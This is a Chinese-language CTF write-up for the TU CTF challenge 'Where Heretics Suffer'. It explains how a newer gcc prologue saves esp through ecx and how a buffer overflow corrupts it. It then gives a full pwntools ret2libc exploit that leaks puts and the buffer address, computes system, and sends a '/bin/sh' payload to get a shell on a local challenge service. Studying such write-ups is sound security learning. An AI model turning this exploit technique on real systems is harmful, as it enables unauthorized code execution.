---
layout: post
title:  "TU CTF - Where Heretics Suffer"
categories: writeup
---

拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：

```markdown
 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
 80485cf:       83 e4 f0                and    esp,0xfffffff0
 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 80485d5:       55                      push   ebp
 80485d6:       89 e5                   mov    ebp,esp
 80485d8:       51                      push   ecx
 80485d9:       83 ec 34                sub    esp,0x34

 ......

 8048682:       b8 00 00 00 00          mov    eax,0x0
 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 804868a:       c9                      leave
 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
 804868e:       c3                      ret
```

可以看到在初始化的時候`lea    ecx,[esp+0x4]`，會把esp得值放到`ecx`中 之後再把`ecx`放到stack上，當我們overflow以後會把原本得直也蓋掉

題目滿好心的有提供很多東西所以可以算出`system`的位置，也有給buffer的位置，所以我們直接把 ret address 填到 buffer 開頭的位置這樣esp，控制好以後esp才不會爛掉，之後照正常疊 `ret2libc` 就行了

```python
from pwn import *

e = ELF('/lib32/libc.so.6')
#e = ELF('./libc.so.6')

r = remote("127.0.0.1",4000)
r.recvlines(2)
puts = r.recvline().strip()[47:57]
print 'puts : ',puts
puts = int(puts, 16)

buffer = r.recvline().strip()[-10:]
print 'buffer :',buffer
buffer = int(buffer,16)

system = puts - ( e.symbols['puts'] - e.symbols['system'] )
print 'system : ',hex(system)

payload = p32(system) + p32(0) + p32(buffer + 4*7) + p32(0) + p32(0) + p32(0) + p32(0)
payload += '/bin/sh\x00'
payload += 'A'*(44-len(payload))
print len(payload)


r.sendline( payload + p32( buffer + 4)  )

r.interactive()
```
